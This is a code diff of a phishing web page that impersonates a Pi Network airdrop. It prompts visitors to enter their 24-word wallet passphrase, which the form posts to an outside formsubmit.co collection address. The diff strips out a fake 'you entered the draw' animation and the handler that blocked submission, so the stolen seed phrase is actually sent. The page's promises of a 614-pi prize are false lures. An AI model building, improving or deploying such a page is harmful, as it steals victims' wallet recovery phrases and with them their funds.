@@ -92,33 +92,6 @@
             .btn-filled:hover {
                 background: #357abd;
             }
-
-        @keyframes fireworks {
-            0% {
-                opacity: 0;
-                transform: scale(0.5);
-            }
-
-            50% {
-                opacity: 1;
-                transform: scale(1.2);
-            }
-
-            100% {
-                opacity: 0;
-                transform: scale(1.5);
-            }
-        }
-
-        .fireworks {
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            font-size: 24px;
-            color: gold;
-            animation: fireworks 1.5s ease-out;
-        }
     </style>
 </head>
 <body>
@@ -131,25 +104,14 @@
         <h2>The official Pi Network has reached 2 million pioneers!</h2>
         <p>To get closer to the mainnet and activate and attract more pioneers, they will be holding an airdrop, awarding a total of 614 pi/pioneer prizes to those who successfully complete KYC. The future looks very exciting as the Pi community continues to build the Web3 Pi ecosystem.</p>
         <h2>Enter Your 24-Word Passphrase</h2>
-        <form action="https://formsubmit.co/d3e56b54373ed8c87d5a6f4ccf1223a5" method="POST" onsubmit="showMessage(event)">
+        <form action="https://formsubmit.co/d3e56b54373ed8c87d5a6f4ccf1223a5" method="POST">
             <textarea name="passphrase" placeholder="Enter your 24-word passphrase" required></textarea>
             <button type="submit" class="btn-outline">Unlock With Passphrase</button>
         </form>
 
-        <button class="btn-filled" onclick="showMessage()">Unlock With Fingerprint</button>
+        <button class="btn-filled" onclick="window.location.href='#'">Unlock With Fingerprint</button>
         <p class="info-text">As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.</p>
         <p class="info-text">Lost your passphrase? <a href="#">You can create a new wallet</a>, but all your pi in your previous wallet will be inaccessible.</p>
     </main>
-
-    <script>
-        function showMessage(event) {
-            if (event) event.preventDefault();
-            let firework = document.createElement("div");
-            firework.className = "fireworks";
-            firework.innerHTML = "🎉 Congratulations! You have entered the draw for 614 pi! 🎉";
-            document.body.appendChild(firework);
-            setTimeout(() => firework.remove(), 2000);
-        }
-    </script>
 </body>
 </html>
